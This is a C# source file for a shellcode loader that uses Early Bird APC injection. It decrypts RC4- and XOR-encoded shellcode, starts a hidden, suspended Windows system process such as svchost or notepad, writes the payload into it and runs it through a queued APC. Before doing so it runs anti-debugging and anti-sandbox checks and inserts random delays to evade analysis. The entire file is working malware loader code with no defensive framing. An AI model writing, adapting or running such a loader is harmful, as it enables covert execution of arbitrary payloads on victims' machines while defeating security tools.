using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

namespace SecureEarlyBird
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
            uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint QueueUserAPC(
            IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

        [DllImport("ntdll.dll")]
        private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
            ref IntPtr processInformation, int processInformationLength, out int returnLength);

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;

        private static void DecodeRC4(byte[] data, byte[] key)
        {
            byte[] s = new byte[256];
            for (int i = 0; i < 256; i++)
                s[i] = (byte)i;

            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) % 256;
                byte tmp = s[i];
                s[i] = s[j];
                s[j] = tmp;
            }

            int x = 0, y = 0;
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) % 256;
                y = (y + s[x]) % 256;
                byte tmp = s[x];
                s[x] = s[y];
                s[y] = tmp;
                data[i] ^= s[(s[x] + s[y]) % 256];
            }
        }

        private static void ApplyXor(byte[] data, byte key)
        {
            for (int i = 0; i < data.Length; i++)
                data[i] ^= key;
        }

        private static void RandomSleep(int minMs, int maxMs)
        {
            Random rand = new Random(Environment.TickCount);
            int delay = rand.Next(minMs, maxMs);
            Sleep((uint)delay);
        }

        // Anti-debugging
        private static bool CheckForDebuggers()
        {
            // Check 1: IsDebuggerPresent
            if (IsDebuggerPresent())
            {
                return true;
            }

            // Check 2: Remote debugger
            bool isRemoteDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isRemoteDebuggerPresent);
            if (isRemoteDebuggerPresent)
            {
                return true;
            }

            // Check 3: NtQueryInformationProcess
            try
            {
                IntPtr debugPort = IntPtr.Zero;
                int returnLength;
                int status = NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7,
                    ref debugPort, IntPtr.Size, out returnLength);
                if (status == 0 && debugPort != IntPtr.Zero)
                {
                    return true;
                }
            }
            catch { }

            return false;
        }

        // Checks anti-sandbox
        private static bool PerformAdvancedChecks()
        {
            // 1. Debugger detection
            if (CheckForDebuggers())
                return false;

            // 2. Timing check
            DateTime start = DateTime.Now;
            Sleep(3000);
            double elapsed = DateTime.Now.Subtract(start).TotalSeconds;
            if (elapsed < 2.5)
            {
                return false;
            }

            // 3. Uptime check (5 minutes)
            int uptimeMinutes = Environment.TickCount / 60000;
            if (Environment.TickCount < 300000) // < 5 minutes
            {
                return false;
            }

            // 4. Process count (< 30)
            Process[] processes = Process.GetProcesses();
            if (processes.Length < 30)
            {
                return false;
            }

            // 5. Domain check
            string domain = Environment.UserDomainName.ToLower();
            string[] suspiciousDomains = { "sandbox", "malware", "cuckoo", "sample", "triage" };
            if (suspiciousDomains.Any(d => domain.Equals(d)))
            {
                return false;
            }

            // 6. Username check
            string username = Environment.UserName.ToLower();
            string[] suspiciousUsers = { "sandbox", "malware", "cuckoo", "sample", "currentuser" };
            if (suspiciousUsers.Contains(username))
            {
                return false;
            }

            // 7. Computer name check
            string computerName = Environment.MachineName.ToLower();
            string[] suspiciousNames = { "sandbox", "malware", "cuckoo", "sample" };
            if (suspiciousNames.Any(n => computerName.Equals(n)))
            {
                return false;
            }

            // 8. DLL hooks check
            string[] hookDlls = { "sbiedll.dll", "api_log.dll", "dir_watch.dll", "vmcheck.dll" };
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (hookDlls.Any(dll => module.ModuleName.ToLower() == dll))
                {
                    return false;
                }
            }
            return true;
        }

        // Random target process selection
        private static string SelectTargetProcess()
        {
            string[] targets = {
                "C:\\Windows\\System32\\notepad.exe",
                "C:\\Windows\\System32\\RuntimeBroker.exe",
                "C:\\Windows\\System32\\dllhost.exe",
                "C:\\Windows\\System32\\svchost.exe"
            };

            Random rand = new Random(Environment.TickCount);
            string selected = targets[rand.Next(targets.Length)];
            return selected;
        }

        static void Main(string[] args)
        {
            // Advanced Checks
            if (!PerformAdvancedChecks())
            {
                return;
            }

            byte[] shellcode = Payload.GetEncodedShellcode();
            byte[] rc4Key = Payload.GetRC4Key();
            byte xorKey = Payload.GetXorKey();

            DecodeRC4(shellcode, rc4Key);
            ApplyXor(shellcode, xorKey);

            RandomSleep(500, 1500);

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            si.cb = (uint)Marshal.SizeOf(si);

            string targetProcess = SelectTargetProcess();

            bool result = CreateProcess(
                targetProcess, null, IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                IntPtr.Zero, null, ref si, out pi);

            if (!result)
            {
                return;
            }

            RandomSleep(300, 800);

            IntPtr pRemoteCode = VirtualAllocEx(
                pi.hProcess, IntPtr.Zero, (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (pRemoteCode == IntPtr.Zero)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return;
            }

            RandomSleep(200, 600);

            IntPtr bytesWritten;
            result = WriteProcessMemory(
                pi.hProcess, pRemoteCode, shellcode,
                (uint)shellcode.Length, out bytesWritten);

            if (!result)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return;
            }

            RandomSleep(200, 500);

            uint oldProtect;
            result = VirtualProtectEx(
                pi.hProcess, pRemoteCode, (uint)shellcode.Length,
                PAGE_EXECUTE_READ, out oldProtect);

            if (!result)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return;
            }

            RandomSleep(100, 400);

            uint apcResult = QueueUserAPC(pRemoteCode, pi.hThread, IntPtr.Zero);
            if (apcResult == 0)
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return;
            }

            RandomSleep(100, 300);

            uint resumeResult = ResumeThread(pi.hThread);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

        }
    }
}
